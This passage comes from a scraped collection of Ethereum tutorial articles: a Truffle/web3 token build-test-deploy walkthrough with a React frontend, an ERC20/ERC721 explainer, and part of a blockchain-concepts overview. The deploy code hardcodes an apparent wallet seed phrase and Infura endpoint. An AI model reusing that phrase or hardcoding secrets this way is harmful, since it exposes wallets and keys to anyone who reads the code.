\"internal\" public ledgerThrough the constructor method, we can set the initialSupply of our tokens upon contract creation. For simplicity, the contract creator will initially possess all the tokens (line 6\u20138).Creator: msg.senderbalanceOf[msg.sender] = initialSupply;Thus, the distribution of tokens must begin from the contract creator. We can achieve this with a transfer method that accepts an address and a uint256 which specify to whom and how much (line 10\u201315).From: msg.sendertransfer(address _to, uint256 _value)Before decrementing the sender\u2019s balance and incrementing the recipient\u2019s balance by _value, we can perform require checks to ensure that the sender has sufficient tokens (line 11) and that the recipient\u2019s new balance does not overflow (line 12).require(balanceOf[msg.sender] >= _value);require(balanceOf[_to] + _value >= balanceOf[_to]);balanceOf[msg.sender] -= _value;balanceOf[_to] += _value;Altogether, our token contract becomes:To compile our contract, we can use solc, which Truffle utilizes under the hood. Let\u2019s install it as a dependency:$ npm install --save solcWe want our compile.js script to begin by deleting everything in the build folder. That way, we can make changes to our contracts and recompile them anytime. In other words, we want to programmatically:Delete the build folder and everything inside.Recreate a new build folder.For each solidity file in the contracts folder, read its content to memory.For each solidity file in memory, compile it also to memory.For each compiled solidity file, write it to the build folder with\u00a0.json as the extension.To build paths to our files, we can use the standard path module. To read and write files, it\u2019s easier to use the fs-extra module instead of the standard fs module. Let\u2019s install that:$ npm install --save fs-extraThus, our script should require in solc, path, and fs-extra:const solc = require(\"solc\");const path = require(\"path\");const fs = require(\"fs-extra\");To build a path to the build directory, we can write:const buildPath = path.resolve(__dirname, \"../build\");To delete the build directory and create a new one in its place, we can write:fs.removeSync(buildPath);fs.ensureDirSync(buildPath);To build a path to our token contract, we can write:const tokenPath = path.resolve(__dirname, \"../contracts\", \"Token.sol\");To read its content to memory, we can write:const source = fs.readFileSync(tokenPath, \"utf8\");To compile its content, we can call:solc.compile(source, 1)The second parameter tells solc the number of contract \u201cclasses\u201d that are present in our file. In our case, it\u2019s just the Token class. When compiled, it looks like this:Notice that it\u2019s a json object. We\u2019re only interested in\u00a0:Token because it contains the bytecode and interface (ABI) that we need. Thus, to compile and write to memory:const output = solc.compile(source, 1).contracts[\":Token\"];Finally, to write output to the build folder as Token.json:fs.outputJsonSync(path.resolve(buildPath, \"Token.json\"), output);Altogether, compile.js becomes:To run our compile.js script, we can execute this command from the project root:$ node migrations/compile.jsThis step is \u201cequivalent\u201d to executing:$ truffle compileWith that, we\u2019re now ready to test our token contract!Truffle TestUnder the hood, Truffle uses the mocha testing framework with chai for assertions. Let\u2019s also use mocha:$ npm install --save mochaFor simplicity, we can just use the standard assert library.To be able to test our token contract, we need a local network and a way to connect to a running client, i.e., a provider. We can set one up with geth, but we will need to sign every transaction manually with Metamask (via port 8545). To get around this, we can use the ganache provider instead which comes with external accounts in an \u201cunlocked\u201d state.ganache provider => local node => local networkThen, we need a way to interact with this provider using JavaScript. We can use web3 for this.JavaScript => web3 => ganache provider Because transactions take time to process by the network, almost every web3 call is asynchronous. Though still in beta, version 1.0 of web3 supports Promises and therefore async and await which make code so much easier to read. Let\u2019s install it:$ npm install --save web3@1.0.0-beta.34Thus, our test script begins by requiring assert, ganache-cli, and web3:const assert = require(\"assert\");const ganache = require(\"ganache-cli\");const Web3 = require(\"web3\");Then, we can create an instance of Web3 with ganache.provider() as the constructor argument:const web3 = new Web3(ganache.provider());Now, we can use this web3 instance to instantiate our token contract. To do so, we will need the interface and bytecode from Token.json.const { interface, bytecode } = require(\"../build/Token\");To connect web3 with the interface, we can write:await new web3.eth.Contract(JSON.parse(interface))To deploy the bytecode, we can utilize the deploy method:.deploy({    data: bytecode,    arguments: [INITIAL_SUPPLY]})We can also pass in our constructor arguments to arguments as an array. To actually send the transaction, we can utilize the send method:.send({ from: accounts[0], gas: 1000000 })We use\u00a0.send() whenever we want to update our contract\u2019s state. Such actions alway return the transaction hash except when deploying. Available parameters are from, gas, gasPrice, and value. The originating address (from) is required but the rest is optional (default values come from ganache). gas and gasPrice specify the gas limit and unit cost of gas, while value specifies how much wei to transfer. If we only want to read data on our contract, we use\u00a0.call() instead. Reading data is always free..send() => update contract's state // not free.call() => read contract's state // freeAs we\u2019ve seen, ganache comes with 10 external accounts for us to use. We can access them through:accounts = await web3.eth.getAccounts();Thus, to deploy a fresh instance of our contract before each unit test, we can use the following test harness:Here, we\u2019ve arbitrarily chosen to deploy the contract from the first external account: accounts[0]We\u2019re now ready to write some unit tests! To begin, we should test that our token contract has indeed been deployed onto the local network. Whenever deployment is successful, web3 returns an instance of the contract that looks like this:Notice that we can access all our public variables and functions through the methods property. Notice also that under options, the address property contains the address to our contract instance on the network. We can use this fact to make an assertion that address must exist for the test to pass.it(\"deploys a contract\", () => {    assert.ok(token.options.address);});For our second test, let\u2019s verify that the contract creator does indeed have possession of all the tokens upon contract instantiation. Through the methods property, we can call balanceOf and pass it accounts[0].it(\"has initial supply\", async () => {    const supply = await token.methods.balanceOf(accounts[0]).call();    assert.equal(supply, INITIAL_SUPPLY);});For our third test, let\u2019s verify that our transfer method actually behaves as we intended.From: accounts[0]To: accounts[1]Amount: TOKENSResult: balance of accounts[0] and accounts[1] should updateTo make this transfer, we can call our transfer method through the methods property like so:await token.methods.transfer(accounts[1], TOKENS)    .send({ from: accounts[0] });To check that the transfer succeeded, we make two more calls to get the new balance of accounts[0] and accounts[1].const fromBalance = await token.methods.balanceOf(accounts[0]).call();const toBalance = await token.methods.balanceOf(accounts[1]).call();Then, we can verify that their balances have been appropriately updated:it(\"can transfer tokens\", async () => {    const TOKENS = 10;    const txHash = await token.methods      .transfer(accounts[1], TOKENS)      .send({ from: accounts[0] });    const fromBalance = await token.methods.balanceOf(accounts[0]).call();    const toBalance = await token.methods.balanceOf(accounts[1]).call();    assert.equal(fromBalance, INITIAL_SUPPLY - TOKENS);    assert.equal(toBalance, TOKENS);});For our last test, let\u2019s verify that the sender needs to have a sufficient balance.From: accounts[1]To: accounts[0]Amount: 10Result: should failTo do this, we can use a try/catch statement to catch the error and assert that it must exist:it(\"requires sufficient balance\", async () => {    try {        await token.methods.transfer(accounts[0], 10).send({ from: accounts[1] });        assert.fail();    } catch (error) {        assert.ok(error);    }});Putting all our unit tests together, we have:To run our tests with npm, we need to add mocha to our package.json file:\"scripts\": {    \"test\": \"mocha\"}Now, we can easily execute:$ npm run testThis is \u201cequivalent\u201d to executing:$ truffle testWith all tests passing, we\u2019re ready to deploy our contract to a real Ethereum network!Truffle MigrateDuring our tests, we used the ganache provider to deploy our contract to our local network. Likewise, to deploy our contract to the public Ethereum network, we need a provider that connects to a real Ethereum node. We could set one up locally with geth, but for simplicity, we will use Infura instead. Also backed by ConsenSys, Infura provides endpoints that we can utilize to easily create a provider.smart contract => ganache provider => local networksmart contract => Infura provider => public networkTo create a custom provider, we can use truffle-hdwallet-provider, which Truffle utilizes under the hood:$ npm install --save truffle-hdwallet-providerInfura provides endpoints to the main network as well as all the test networks. Let\u2019s use the Rinkeby testnet so we don\u2019t have to spend real money. Let\u2019s also create a new vault on Metamask for testing. With the Rinkeby endpoint from Infura and the seed phrase from Metamask, we can create a provider like this:const Provider = require(\"truffle-hdwallet-provider\");const provider = new Provider(\"pepper stable ripple enrich provide    business ankle tank net lumber acquire earn\", \"https://rinkeby.infura.io/DPHGLx2mBJeWsuDv1jFV\");// seed phrase and endpoint only needed until we deploy and attain the address to our contract on the blockchainLike before, we can pass our provider to web3 to get a fresh instance:const Web3 = require(\"web3\");const web3 = new Web3(provider);Reusing the deploy logic from our test harness with this web3 instance, we get:Under the hood, Metamask also uses Infura! For reference, we output the contract address to the console. To run this script, we execute:$ node migrations/deploy.jsOur token contract is now live on Rinkeby!https://rinkeby.etherscan.io/address/0x6431505264aEF4CfEA510633C8Ce5970404C821fThis is \u201cequivalent\u201d to executing:$ truffle migrateFinally, let\u2019s create a frontend that connects to our live contract!Truffle Unbox\u00a0DrizzleTo setup the boilerplate for our frontend, we can use Truffle to \u201cunbox\u201d Drizzle.$ truffle unbox drizzleDrizzle is awesome because it comes with a Redux store that syncs with our contract state.react dapp => redux store => contract stateTo better understand how this process works, we will use create-react-app instead, which Drizzle utilizes under the hood. Let\u2019s install it globally:$ sudo npm install -g create-react-appAnd then run the create-react-app command to create a boilerplate project called \u201creactapp\u201d:create-react-app reactappTo launch this app, we execute this command from the project root:$ npm run startLet\u2019s update the main App component in src/App.js to show the balance and a form to transfer tokens:We want our users to be able to use Metamask to sign and submit transactions to our live contract. We can achieve this by taking advantage of the web3 object that Metamask injects to the global window:This web3 object comes with a built-in provider that we can use:window.web3.currentProviderHowever, notice that this web3 version is 0.20.3. To use version 1.0 instead, we need to install it as a dependency:$ yarn install --save web3@1.0.0-beta.34Then, we can take advantage of Metamask\u2019s provider like this:import Web3 from \"web3\";const web3 = new Web3(window.web3.currentProvider);By using our version of web3, we also ensure that it will not suddenly change and break our code. Understandably, Metamask plans to stop injecting the web3 object after realizing that most dapps only need its provider. In the near future, ethereumProvider will be injected instead.dapp => web3 => ethereumProvider => live contractLet\u2019s export our web3 instance for other files to use:To connect to our live contract, we need the ABI from our compilation process and the address of our contract on Rinkeby:const token = new web3.eth.Contract(ABI, ADDRESS);Copying over the ABI from Token.json and the contract address from running deploy.js, we can export our live contract instance like so:Now, we can import our token instance and web3 instance for our App component to use:In the componentDidMount lifecycle method, we can make a web3 call to get all the user\u2019s Metamask accounts (line 12):const accounts = await web3.eth.getAccounts();Then, we can call our token contract to get the balance of the first account (line 13):const balance = await token.methods.balanceOf(accounts[0]).call();In Metamask, the currently selected account is always accounts[0].To help process the form submittal, we can create a helper method that calls our contract\u2019s transfer function (line 18\u201332). Note that we don\u2019t have to specify the gas and gasPrice because Metamask will automatically calculate the best values for the user.form submit => react transfer method => contract transfer functionBecause transactions take time to process on a real network, we should provide a status message to inform the user:this.setState({ status: \"Transfer in progress...\" });Let\u2019s test the UI! When we choose the Metamask account that created the token contract (Account 1), we see the right balance of 1000, our initial supply.Selecting a different account shows the appropriate balance of 0. Let\u2019s now make a transfer of 50 tokens from \u201cAccount 1\" to \u201cAccount 2\u201d. Go to Metamask and copy the second account\u2019s address:Now past it into the form field:When we click \u201cTransfer\u201d, Metamask will open a modal to ask for confirmation:Even if no ethers are being sent, Metamask will always ask for confirmation because transactions are not free. After the network accepts our transaction, the user\u2019s balance should update:If we switch to \u201cAccount 2\u201d on Metamask, the balance should update too:Using the txHash that was returned, we can view our transaction in realtime on any blockchain explorer:https://rinkeby.etherscan.io/tx/0x2c081e0a67545b0e92a7e19eb156a446a5431aa3c2440a029556994dde49944dManual testing of the UI can be quite tedious. To help us automate testing of React components, create-react-app integrates with the Jest testing framework. In fact, Drizzle goes one step further, integrating with Redux to give us a store that syncs with our contract data.React component => Drizzle store => contract stateMoreover, Drizzle automatically generates forms for all our contract functions, which we can easily map to the appropriate reducers.form submit => Drizzle reducer => contract functionSince the reducers are mostly asynchronous web3 calls, Drizzle also integrates with redux-saga to make asynchronous testing a breeze!ConclusionWhat makes Ethereum special is its emphasis on the smart contract layer, which Truffle also emphasizes, providing a convenient framework and a higher-order abstract contract that decorates any Solidity contracts with the functionalities to compile, test, upgrade, and deploy, seamlessly. This article is a deep dive into those features with the hope of imparting a clearer understanding and a better intuition.For a real live example of how Truffle is used in one of our open source projects, check out:How to Decentralize the Film IndustryA Crowdfunding dApp to Empower Indie Filmmakers! \ud83d\udcaamedium.comIn this article, we open up the entire source code of our dApp to explain our entire thought process, from architecture to a fully functional UI across our entire development stack!We like to think of HeartBank\u00ae as the nonprofit twin of ConsenSys \ud83d\ude07Reference: https://truffleframework.com/docs/truffle/quickstart", "responses": "5"}, {"title": "Ethereum Development Walkthrough (Part 4: Tokens and\u00a0ERCs)", "author_name": "dev_zl", "link": "https://hackernoon.com/ethereum-development-walkthrough-part-4-tokens-and-ercs-68645cf2f73e?source=search_post", "post_date": "Jan 29, 2018", "readtime": "8 min read", "upvotes": "720", "content": "Ethereum Development Walkthrough (Part 4: Tokens and\u00a0ERCs)dev_zlBlockedUnblockFollowFollowingJan 29, 2018From a developer point of view, tokens on Ethereum are simply smart contracts. In the world of drinks, they could be coffee, and anyone could make their own variant.You\u2019ve probably heard of ERC20, ERC721, or other standards. These are simply a set of basic functions that the community of developers agreed to adopt. Nobody will stop you from using your own functions, and creating a script that will manage virtual coins however you like.A famous quote from Pirates of the Caribbean apply very well in this case:But following a standard has a lot of advantages that you should not overlook. First of all, when you make a token that comply with a standard, everybody will know what your token does and how to interact with it, and therefore, will trust it a bit more. DApps, like Mist, will recognize it as a token, and will show it with a special UI. Also, you\u2019ll find a generic implementation of the token smart contract already written by the community, in a framework like OpenZeppelin\u2019s for example, that is well tested by many experts, and gives you a solid starting point.In this tutorial, we will write a basic and incomplete ERC20 token from grounds up, then we will turn it into an ERC721 (which is fundamentally different) so we can see the differences between the two.The reason for that is, you will understand how a token works, that it is not a closed black box, and that the ERC20, an accepted standard that has been in work for two years so far, has failure-points that you\u2019ll not see if you are only running a couple commands to create your token instantly from a framework.Let\u2019s make our\u00a0tokenThe ERC20 was created to standardize fungible tokens so they can be re-used by other applications: from wallets to decentralized exchanges.Fungible means that it can be interchanged with a token of the same type, in other words, all the tokens are identical (like money, a dollar is the same as any other dollar). A non-fungible token would be one that represents a unique asset (like a house, a property, a piece of art etc.). While a fungible token hold value in itself, a non-fungible token is just the representation of an asset in a smart contract.To make an ERC20 compliant token, we must implement the following functions and events:The standard doesn\u2019t provide the body of these functions, that\u2019s because you could write them however you like, and it\u2019s well within the standard to return null/false values if you don\u2019t want to support some functions.Note: In this tutorial, it\u2019s not interesting to copy the code, you\u2019ll benefit more from understanding what happens, full examples will be linked at the end of this tutorial anyway.ImplementationAt first, we would want to give our token a name, so we will use a public variable:Then give it a symbol:And of course the number of decimals:Since Solidity doesn\u2019t fully support fixed-point numbers, you have to represent all numbers like integers. Now, a value of \u201c123456\u201d, will be either \u201c1234.56\u201d tokens when you use 2 decimals, or \u201c12.3456\u201d if you use 4 decimals for example. A value of 0 decimals is when you don\u2019t want you token to be \u201cdivisible\u201d. Ether, the cryptocurrency of Ethereum, uses 18 decimals.Generally, you wouldn\u2019t use more than 18 decimals for your token, unless you want an expert from the other side of the world to tell you how stupid you are, and ask you why would you use more than 18 decimals, and tell you how 18 is the holy number because Ether uses 18 decimals.We will count the total supply of our token, and keep track of how much tokens everyone has:Of course you will start with 0 tokens, unless you generate some in the constructor of your token smart contract, like this for example:The \u201ctotalSupply()\u201d function is just a getter for the \u201ctotalSupply\u201d variable:Same for the \u201cbalanceOf()\u201d function:Now, the real magic happens in the \u201ctransfer()\u201d function, it\u2019s where an address can send tokens to another oneThat\u2019s really the core of an ERC20 token.\u201capprove()\u201d, \u201ctransferFrom()\u201d, and \u201callowance()\u201d functions are part of what makes a token ERC20 compliant too, but they are vulnerable.When an address \u201capprove()\u201d another one, the approved address could spend some tokens from the approving address balance on its behalf using the \u201ctransferFrom()\u201d function. \u201callowance()\u201d is just a getter function to see how much an address could \u201ctransferFrom()\u201d from the balance of another address.These functions actually represent security issues, because, when an address approve another one to spend X tokens, and for some reason decide to increase or decrease that amount to Y tokens, the approved address could quickly transfer the X tokens of the first allowance before the transaction to change the allowance is executed, and after it\u2019s executed, the approved address could transfer the Y newly approved tokens again. I said in the last parts that there is no certainty when a transaction is mined, and miners can slightly tamper with when some transactions are executed.Now, while some safer \u201ctransferFrom()\u201d implementations were suggested to make the function more fail-proof (as outlined above, the standard is just a bunch of prototypes of functions and expected behavior, and it\u2019s up to your to write the bodies) some other proposals are being discussed right now, because there are other shortcomings to the ERC20. Two of these propositions are the ERC223 and ERC777.The motive behind the ERC223 proposal is to avoid sending tokens to the wrong addresses or contracts that doesn\u2019t support using these tokens, because millions of dollars where lost due to that as outlined in the 223th Ethereum Request for Comments. The ERC777 tries to notify the receiving address of the token it will receive, among other things. The ERC777 proposal seems to have the most momentum in the community right now to replace the ERC20.ERC721Now, the ERC721 is fundamentally a different thing from the ERC20 and its family.In ERC721, tokens are unique. The ERC721 was proposed a few months ago, and the implementation that has made it famous is CryptoKitties, a game where people collect virtual cats, and these cats are represented with non-fungible tokens inside the smart contract that runs the game.Now, if we want to turn an ERC20 contract to an ERC721 one, we will need to see how the second keep track of the tokens.In ERC20, every address has a balance of tokens. In an ERC721 contract, every address will have a list of its tokens:Since Solidity has its limitations, and there is no \u201cindexOf()\u201d method for arrays, we have to keep track of a token in the owner array manually:We could of course implement our own library that finds the index of an element, but taking into account possibly long running loops, it\u2019s better to use a mapping.And of course, to track tokens easily, we can add a mapping that shows the owner of each token:That\u2019s all the difference between how the two proposals manage tokens.The \u201ctransfer()\u201d functions inside an ERC721 contract will set a new owner for the token:The code is longer, but it\u2019s simply the necessary steps to move a token.One point to not forget is, the ERC721 has also the \u201capprove()\u201d and \u201ctransferFrom()\u201d methods, so inside our transfer function, we would have to add an other instruction inside our \u201ctransfer()\u201d method, so an approved address for a token can no longer move the token once it has a new owner, something like the following one:MintingOne thing that can apply to both ERC20 and ERC721 tokens is, we would probably want to generate more fungible tokens, or create a new non-fungible token, we would do that with a function generally named \u201cMint()\u201d.An example for such a function is the code below:We create a new token with an arbitrary number. Depending on your use case, you would probably want to authorize only certain address(es) to be able to mint new tokens inside your contract.An important thing to note here is, while the \u201cmint()\u201d function is not present on the interface of the standards, we added it, just like we can add other functions to enhance and add more functionalities to our token. For example, we could add a system of buying and selling tokens for an amount of ether, or a function to remove tokens that we don\u2019t want anymore.MetadataNow, we said that non-fungible tokens represent an asset, so, in most cases, we would actually want to describe that asset. We could do using a string like the following:See, the smart contract is a certification rather than something that contains an object. You can\u2019t store a car inside a smart contract for example, but you could very well store its license plate, or some other legal identification.One of the most used techniques right now, when it comes to virtual assets, is to use an IPFS hash as metadata. An IPFS hash is the address of a file stored on IPFS. To put it in simple words, IPFS is like a torrent version of HTTP. When a file is added on IPFS, it would become virtually always available on at least one of the computers that are connected to the IPFS network.While the file is accessible on IPFS or a HTTP link for everyone to see, the \u201ccertification of ownership\u201d is registered in a smart contract. This is really not programming, but a new application of non-fungible tokens. It has a name \u201cCrypto-collectibles\u201d, and it\u2019s hot right now.Now, back to our codes, the original discussion of the ERC721 proposal is a bit dead as of now, and the original poster hasn\u2019t updated the thread in a while, so there is a new continuation of that discussion here. It\u2019s called ERC841 and they changed the name of non-fungible tokens to \u201cdeeds\u201d.There is also another proposal, ERC821, that wishes to implement newer and better design patterns inspired by the ERC223 & ERC777 proposals. ERC821 and ERC841 seek to achieve the same goal, but with a slightly different approach, both are not perfected yet, and you can join the discussion around these two potential standards if you have a valuable input.You can find example implementations of both ERC20 and ERC721 (that you should not use in production) on the Github repository for this part:devzl/ethereum-walkthrough-4ethereum-walkthrough-4 - Repository for the fourth part of the tutorial series on Ethereum, \"Ethereum development\u2026github.comAlternatively, it will be a good idea to take a look at the OpenZepplin framework, they have excellent, (mostly) audited, and modular smart contracts (Of course, you should read the content of every contract before deciding which ones to use).This conclude this fourth part of series. In the next one we will see how to create a DApp.If you liked this tutorial, you can find me @dev_zl.Bonus: ICOs & CrowdsalesInitial coin offerings (ICOs) are a bit outside of the development part of an Ethereum project, but in essence, they are just crowdfunding.If a startup needs some funds, they create their own token, and sell some during a period of time, called a crowdsale or ICO.Before smart contracts and the blockchain technology, startups would use a crowdfunding website to raise money, but those websites take generally a handsome fee in the process. Now, with an ICO, you cut the middleman and raise the money directly.Right now, there are more scams than real projects raising money, so from an investor point of view, you should be wary where to put your money. From a developer point of view, a crowdsale is just a smart contract, that sells some tokens from a start to an ending date in exchange for ether. There is no standard way to achieve that, but you will find a good implementation on OpenZepplin\u2019s repo for example. Alternatively, there is an easy tutorial on Ethereum\u2019s website.", "responses": "3"}, {"title": "A Gentle Introduction to Ethereum Programming, Part\u00a03", "author_name": "Facu Spagnuolo", "link": "https://blog.zeppelin.solutions/a-gentle-introduction-to-ethereum-programming-part-3-abdd9644d0c2?source=search_post", "post_date": "Jan 12, 2018", "readtime": "8 min read", "upvotes": "389", "content": "A Gentle Introduction to Ethereum Programming, Part\u00a03Facu SpagnuoloBlockedUnblockFollowFollowingJan 12, 2018This is the third part of our Ethereum introduction guide. If you haven\u2019t read parts 1 and 2, I highly recommend them to better understand this post.Enjoy, and please do not hesitate to reach out with questions, corrections or feedback.Index1. Taking the first steps2. Interacting with a contract3. Frameworks & Tools in the real world3.1. Deploying with Truffle3.2. Testing smart contracts3.3. OpenZeppelin4. A real DApp, a token marketplace\u200a\u2014\u200acoming soon", "responses": "7"}, {"title": "Advanced Blockchain Concepts for Beginners", "author_name": "Coral Health", "link": "https://medium.com/@mycoralhealth/advanced-blockchain-concepts-for-beginners-32887202afad?source=search_post", "post_date": "May 7, 2018", "readtime": "12 min read", "upvotes": "767", "content": "Advanced Blockchain Concepts for BeginnersCoral HealthBlockedUnblockFollowFollowingMay 7, 2018Have you joined our Telegram chat yet? Why wait? You\u2019re missing out on a vibrant community talking about cool blockchain topics like the ones you\u2019ll learn about in this article!Many readers by now have seen our coding tutorials on how to code your own blockchain, how to code your own proof of work, and how to set up a P2P network. After reading these tutorials, there you are, confident in your blockchain mastery and eager to tell everyone all about your newfound knowledge at your next meetup!But then you walk up to the water cooler and hear a conversation like this:\u201cPayment channels are the next big thing!\u201d\u201cI\u2019m pretty skeptical of the Bitcoin Lightning Network. While payment channels sound great in concept, how on earth are they going to solve the traveling salesman problem at that kind of network scale? Side chains are where it\u2019s at!\u201d\u201cYou might be right. State channels are pretty cool. Maintaining turing completeness on both the main and side chains gives a lot of functionality and scaling flexibility.\u201dWhat on earth are they talking about? Don\u2019t worry! We\u2019re going to help you out. In this article, we\u2019ll walk you through all the latest buzz words and concepts in advanced blockchain development, but keep the details at a manageable level.By the end of this post, you\u2019ll be able to freely participate in conversations like the above. This is not a coding tutorial, as we\u2019ll just be presenting important concepts at a high level. However, we may follow up with programming tutorials on these ideas. This article will be helpful to both programmers and non-programmers alike. Let\u2019s get going!Here are the ideas we\u2019ll tackle and build on in this article:Byzantine fault toleranceSmart contractsTuring completenessDelegated Proof of StakeState channels / Side chainsPlasmaPayment channelsByzantine Fault ToleranceByzantine fault tolerance (BFT) is what keeps the blockchain fundamentally secure. For simplicity, let\u2019s say there were 100 nodes in a blockchain network (there are currently about 10,500 full Bitcoin nodes in the world). What happens when one node wants to tamper with the latest block and say other Bitcoin users sent him a whole bunch of Bitcoin when they really didn\u2019t?The system needs to be fault tolerant and be able to override this malicious node and agree on the correct state of the blockchain.The term originated from the \u201cByzantine Generals Problem\u201d. Let\u2019s take a quick look at it:Photo credit: https://www.weusecoins.com/bitcoin-byzantine-generals-problem/In this scenario, the yellow camps need to coordinate to attack the central enemy city. But they need to agree on a time to attack. To do this, the camps need to clandestinely send messengers through the enemy city to tell another camp when to attack.Not only does the receiving camp need to receive the message, it needs to send back a messenger so the sending camp knows the receiving camp got the message. The receiving camp needs to know the sending camp got the message acknowledging the receiving camp got the original message. You can see this cycle goes on forever!Throw in another wrinkle: what if there is a traitor camp that intentionally does not send a messenger, or sends a messenger with the wrong information?In the days before computers, this \u201cByzantine Generals Problem\u201d was unsolvable. Luckily today, we have computers and distributed systems. The solution to the Byzantine Generals Problem in blockchain is Proof of Work.Our Proof of Work tutorial talks about it in depth, but the best explanation might come from Satoshi Nakamoto himself. If the camps above start receiving messages that don\u2019t agree, they rely on executing a Proof of Work. The Proof of Work is sufficiently complicated and requires significant computing power. Once one camp solves the Proof of Work, it broadcasts the results to the other camps. This message is now accepted in a chain of messages and the competing messages are dropped by the other camps.If the solving camp tampered with the data, the hashed chain would be quickly identified by the other camps as faulty and rejected in favor of the next solving camp. This provides a disincentive for the initial camp to cheat, since they will have wasted a bunch of energy to solve the Proof of Work and gotten no benefit from it.Imagine over several hours, the camps produced a chain of messages that each required intensive Proof of Work. This means that the majority of the camps had to agree on this chain of messages and each camp can confidently trust the final outcome. It\u2019s important to note here that Proof of Work does not care about the message itself, only that the nodes agreed to the final message. This majority network consensus keeps it secure and provides a solution to the Byzantine Generals Problem, leading to Byzantine Fault Tolerance.Smart Contracts & Turing CompletenessLet\u2019s switch gears quickly before we get back to talking about trust mechanisms. We\u2019ll define what a \u201csmart contract\u201d is. The first blockchain that was popularized is obviously the Bitcoin blockchain. But the functionality of Bitcoin is very limited. All it can do is record transaction information. It\u2019s only useful to keep track of the fact that Alice sent Bob 1 Bitcoin.What if we wanted some richer logic? What if instead of Alice just simply sending Bob 1 Bitcoin, we could program in logic that says \u201cAlice and Bob place a sports bet. If the Cleveland Cavaliers ever lose to the Toronto Raptors in a playoff series, take 1 Bitcoin from Alice\u2019s wallet and transfer it to Bob\u2019s\u201d.How awesome would that kind of functionality be? We could program in that logic, have it sit on the blockchain and Bob can rest comfortably knowing he can safely place that bet and Alice will be forced to pay the 1 Bitcoin if the Raptors ever beat the Cavs, and Alice can rest comfortably knowing she\u2019ll never have to pay.This is exactly what Ethereum is. You can think of it as a programmable Bitcoin. Smart contracts are little programming functions that sit on the Ethereum blockchain. You invoke a smart contract by calling the contract (or function) address and the arguments you send it will produce a deterministic result based on the logic of the function.A sample Ethereum smart contract function looks like this:This function does a simple check to transfer tokens from Alice to Bob. The function signature takes in Bob\u2019s wallet address and an amount to transfer. The require statement ensures Alice has enough Ether (Ethereum\u2019s currency) to give Bob. Then the function subtracts that amount from Alice\u2019s wallet and adds the same amount to Bob\u2019s wallet.Pretty straight forward right? This is a smart contract in its simplest form. But there is a world of possibilities for smart contracts from creating healthcare applications (what we do at Coral Health) to making collectible digital asset based games like Cryptokitties.Turing CompletenessWhen people say Ethereum is \u201cTuring Complete\u201d it means that a fully featured programming language is available on the Ethereum blockchain. The code we wrote above is written in a language called Solidity, which is the specific smart contract language to Ethereum.By contrast, the Bitcoin blockchain is not Turing complete since it has little to no ability for data manipulation. It has no ability for a user to deploy if else or goto statements. This is a bit of a simplification but anytime you hear someone say something is \u201cTuring complete\u201d you can do a quick check to see if there is functionality for data changes, memory changes and if/else statements. If there is, that\u2019s usually what they mean.Now that we\u2019ve tackled a few of these definitions let\u2019s move back to trust considerations of the blockchain.Delegated Proof of Stake\u00a0(DPOS)I want you to be the next Proof of Stake\u00a0witness!If you want a deeper look at Proof of Stake check out our detailed POS post. In short, while Proof of Work is an effective mechanism to secure the blockchain and provides a trustless consensus paradigm, it\u2019s extremely energy intensive because of all the computing power required to solve hash problems. Also, while it was meant to be decentralized, it\u2019s actually becoming more centralized as miners consolidate and massive mining setups eat up larger shares of winning blocks.Delegated Proof of Stake (DPOS) aims to solve this. Initially conceived by Dan Larimer, instead of using hardware to solve hashes, he proposed that people in the network vote for \u201cwitnesses\u201d. These witnesses are responsible for keeping the network secure and each of these witnesses puts some amount of digital currency in escrow.The witnesses who put more funds in escrow have a greater chance of mining (or minting) the next block. The incentives line up nicely here. There are only a few witnesses and they get paid to be witnesses, so they are incentivized to not cheat. If they do cheat and get caught, they not only get voted out in favor of the next eagerly awaiting witness, they lose all the funds they had in escrow.Many people believe this is the future of the blockchain. It maintains network security and allows for scalability. The biggest criticism is that it heavily favors those with more funds as smaller holders have no chance of becoming witnesses. But the reality is, smaller players have no hope of participating in Proof of Work either, as mining from your own laptop at home is no longer a reality. Smaller players get outcompeted by bigger players who have massive mining rigs. STEEM and EOS are examples of DPOS blockchains. Even Ethereum is moving to POS with its Casper project.State Channels / Side\u00a0ChainsSo far we\u2019ve been talking about all-or-nothing approaches. Pure decentralization vs. central servers, Proof of Work vs. Proof of Stake. Just like everything else in life, hybrid ideas might be superior to binary ones. Blockchain developers are quickly realizing this.As we\u2019ve talked about, writing to the blockchain is slow and expensive. This is because every node in the entire network needs to verify and slurp in the whole blockchain and all the data it contains. Executing a large smart contract on a blockchain can be prohibitively expensive, and doing things like storing images on blockchains is economically infeasible.What if we could run heavy computations in a more centralized fashion, say on a single server, and then periodically integrate the results onto the main blockchain for posterity. We temporarily expose some vulnerability while the parallel server runs the heavy computation, but we get a massive benefit in that we don\u2019t have to run the computation on chain, and simply need to store the results for future verification. This is the general premise behind Truebit. We won\u2019t get into all the details of Truebit but there is a concept of challengers, who check to see the computations that were made have high fidelity.This is what, at its core, state channels are. Imagine we wanted to play a game of Starcraft and have a smart contract that pays 1 ETH to the winner. It would be ridiculous for each participant to have to write on the main Ethereum network each time a Zergling was killed by a Zealot, or when a Command Center was upgraded to an Orbital Command. The gas cost (Ethereum gas, not Starcraft gas) and time for each transaction would be prohibitive.Instead, what if the game was played in its own \u201cchannel\u201d? Each time a player made a move, the state of the game is signed by each player. After an epic battle where the Protoss player takes out the remaining Zerg forces and forces a gg, the final state of the game (Protoss wins) is sent to a smart contract on the main chain. This neutral smart contract, known as a Judge, waits a while to see if the Zerg player disputes the outcome. If the Zerg player doesn\u2019t, the Protoss player is paid the 1 ETH.Instead of having to record thousands of transactions that occurred during the game on the main chain, all the transactions are done off chain and only the final state is recorded on chain.Similarly, a side chain is a separate blockchain that runs in parallel to the main chain. The term is usually used in relation to another currency that\u2019s pegged to the currency of the main chain. For example, staying with the Starcraft motif, say we had an in-game currency called Minerals (oh wait, we do!). We could allow players to peg their Ether (or ETH) to purchase more Minerals in-game. So we reserve some ETH on the main chain, and peg, say 500 Minerals to 1 ETH.Then the player can spend their 500 Minerals in-game however they wish. Given the rapid rate at which Minerals can be spent and earned, Mineral-based transactions only happen on the side chain.What\u2019s really cool is that this architecture is fractal. We can then have a side chain of the Mineral chain to represent another scarce in-game asset. We can then make a side chain of that scarce in-game asset, and so on. There is no limit to how many side chains and levels of side chains we can have!Plasma, a project by Ethereum, uses this side chain concept. It encourages transactions to happen on side chains (or child chains). An authority governs each of the child chains. If the authority starts acting maliciously, anyone on the child chain can quit the child chain and take back their pegged assets on the main chain. It\u2019s in its early stages of development but shows a lot of promise in handling some of Ethereum\u2019s scalability issues.Payment ChannelsLastly, we\u2019ll talk about payment channels. They\u2019re an extension of 